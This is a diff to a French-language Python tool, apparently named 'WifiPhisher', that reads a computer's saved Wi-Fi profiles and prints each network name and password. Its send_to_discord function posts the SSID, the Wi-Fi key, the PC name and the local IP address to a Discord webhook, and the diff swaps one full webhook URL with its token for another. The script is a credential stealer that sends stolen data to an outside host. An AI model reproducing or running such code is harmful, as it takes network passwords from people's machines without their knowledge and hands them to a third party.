@@ -34,8 +34,8 @@ def show_network_info(network_name):
             elif "Contenu de la cl‚            :" in line:
                 key_content = line.split(":")[1].strip()
         if ssid and key_content:
-            print("\033[92m[+]\033[0m Nom du SSID:", ssid)
-            print("\033[92m[+]\033[0m Contenu de la clé:", key_content + " ")
+            print("\033[92m [+]\033[0m Nom du SSID:", ssid)
+            print("\033[92m [+]\033[0m Contenu de la clé:", key_content + " ")
             send_to_discord(ssid, key_content)
         else:
             print("\033[91m [-] \033[0m Informations manquantes pour le réseau '{}'. ".format(network_name))
@@ -43,15 +43,16 @@ def show_network_info(network_name):
         print(f"\033[91m [-] \033[0m Impossible de trouver des informations pour le réseau '{network_name}'. ")
 
 def send_to_discord(ssid, key_content):
-    webhook_url = 'https://discord.com/api/webhooks/1248239824775680000/eFzhxtEEdZtxdLTZX0n3JbR5ri1jlg8IyMf8ESc49RILiZ5aEV9SPtsqIAR9i4tMNAJr'
+    webhook_url = 'https://discord.com/api/webhooks/1248323325533356106/-ThnPanbKvSy7dVFm5B9CmJJMYA1U_kLqEOAS04FELBAv5Mzf81rHV9qG7iIuYyHF5yb'
     
     # Get the local IP address
     hostname = socket.gethostname()
     local_ip = socket.gethostbyname(hostname)
     pc_name = platform.node()
     
+    
     data = {
-        "content": f"**PC Name:** {pc_name}\n**IP Address:** {local_ip}\n**SSID:** {ssid}\n**Key Content:** {key_content}"
+        "content": f"**PC Name:** `{pc_name}`\n**IP Address:** `{local_ip}`\n**SSID:** `{ssid}`\n**Key Content:** `{key_content}`"
     }
     
     try:
@@ -67,10 +68,9 @@ if __name__ == "__main__":
     clear_screen()
     logo = """
 \033[34m
-                                               ╦ ╦╦╔═╗╦╔═╗╦ ╦╦╔═╗╦ ╦╔═╗╦═╗
-                                               ║║║║╠╣ ║╠═╝╠═╣║╚═╗╠═╣║╣ ╠╦╝
-                                               ╚╩╝╩╚  ╩╩  ╩ ╩╩╚═╝╩ ╩╚═╝╩╚═
-
+                                            ╦ ╦╦╔═╗╦╔═╗╦ ╦╦╔═╗╦ ╦╔═╗╦═╗  ┓ ┓
+                                            ║║║║╠╣ ║╠═╝╠═╣║╚═╗╠═╣║╣ ╠╦╝  ┃ ┃
+                                            ╚╩╝╩╚  ╩╩  ╩ ╩╩╚═╝╩ ╩╚═╝╩╚═  ┻•┻
                                     ███████╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ 
                                     ██╔════╝██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
                                     ███████╗█████╔╝  ╚████╔╝ ██║  ██║█████╗  ██████╔╝
@@ -92,7 +92,7 @@ if __name__ == "__main__":
         clear_screen()
         print(logo)
         for index, network in enumerate(saved_networks, start=1):
-            print(f"\033[94m{index}. {network}\033[0m")
+            print(f"\033[94m {index}. {network}\033[0m")
 
         choice = input("\033[95m Entrez le numéro du réseau que vous souhaitez consulter : \033[0m")
         try:
